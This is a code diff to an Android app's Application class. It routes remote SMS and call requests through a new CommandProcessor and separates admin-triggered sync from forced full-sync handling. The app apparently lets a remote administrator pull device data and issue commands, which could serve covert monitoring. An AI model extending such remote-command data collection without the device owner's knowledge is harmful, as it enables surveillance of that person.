@@ -9,6 +9,7 @@ import androidx.hilt.work.HiltWorkerFactory
 import androidx.preference.PreferenceManager
 import androidx.work.Configuration
 import com.boxx.datasync.domain.repository.DataRepository
+import com.boxx.datasync.sync.CommandProcessor
 import com.boxx.datasync.sync.DataContentObserver
 import com.boxx.datasync.sync.SyncService
 import com.boxx.datasync.utils.DeviceIdHelper
@@ -28,6 +29,9 @@ class UserApplication : Application(), Configuration.Provider {
 
     @Inject
     lateinit var repository: DataRepository
+
+    @Inject
+    lateinit var commandProcessor: CommandProcessor
 
     private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var heartbeatJob: Job? = null
@@ -52,8 +56,7 @@ class UserApplication : Application(), Configuration.Provider {
         setupContentObservers()
         observeSyncRequests()
         startHeartbeat()
-        observeSmsRequests()
-        observeCallRequests()
+        commandProcessor.startListening(this)
     }
 
     fun isPermissionGranted(permission: String): Boolean {
@@ -170,15 +173,16 @@ class UserApplication : Application(), Configuration.Provider {
                 snapshot?.let { doc ->
                     val requestedAt = doc.getLong("syncRequestedAt") ?: 0L
                     val fullSyncRequestedAt = doc.getLong("forceFullSyncRequestedAt") ?: 0L
-                    val lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)
+                    val lastHandledFullSync = prefs.getLong("last_handled_full_sync", 0L)
+                    val lastHandledSync = prefs.getLong("last_handled_sync", 0L)
 
-                    if (fullSyncRequestedAt > lastHandledSyncRequest) {
-                        Log.d("UserApplication", "ADMIN_FULL_SYNC_REQUEST_RECEIVED")
-                        prefs.edit().putLong("last_handled_sync_request", fullSyncRequestedAt).apply()
+                    if (fullSyncRequestedAt > lastHandledFullSync) {
+                        Log.d("UserApplication", "CLIENT_FORCE_FULL_SYNC_RECEIVED")
+                        prefs.edit().putLong("last_handled_full_sync", fullSyncRequestedAt).apply()
                         triggerSyncService(isFullSync = true)
-                    } else if (requestedAt > lastHandledSyncRequest) {
+                    } else if (requestedAt > lastHandledSync) {
                         Log.d("UserApplication", "ADMIN_SYNC_REQUEST_RECEIVED")
-                        prefs.edit().putLong("last_handled_sync_request", requestedAt).apply()
+                        prefs.edit().putLong("last_handled_sync", requestedAt).apply()
                         triggerSyncService(isFullSync = false)
                     }
                 }
